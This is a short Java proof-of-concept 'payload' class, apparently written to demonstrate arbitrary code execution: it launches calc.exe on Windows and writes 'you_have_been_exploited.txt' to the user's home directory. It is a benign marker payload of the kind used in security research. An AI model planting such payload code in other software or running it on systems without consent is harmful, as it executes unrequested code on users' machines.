package payload;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.util.Date;

/**
 * Small example payload to show we can do anything.
 */
public class DemoPayload {

	public static void main(String args[]) {
        if( System.getProperty("os.name").toLowerCase().contains("windows") ) {
        	windowsDemo();
        }
        defaultDemo();
	}
	
	public static void windowsDemo() {
		try {
			Runtime.getRuntime().exec("C:\\Windows\\system32\\calc.exe");
		} catch (IOException e) {
		}
		try {
			Runtime.getRuntime().exec("C:\\WinNT\\system32\\calc.exe");
		} catch (IOException e) {
		}
	}
	
	public static void defaultDemo() {
		String filename = System.getProperty("user.home")+"/you_have_been_exploited.txt";
		try {
			FileOutputStream fout = new FileOutputStream(filename);
			PrintWriter out = new PrintWriter(new OutputStreamWriter(fout));
			out.println("Really. Btw. this was on "+new Date());
			out.close();
		} catch (FileNotFoundException e) {
			System.out.println("Could not create file in home dir.");
			e.printStackTrace();
		}
	}
	
}
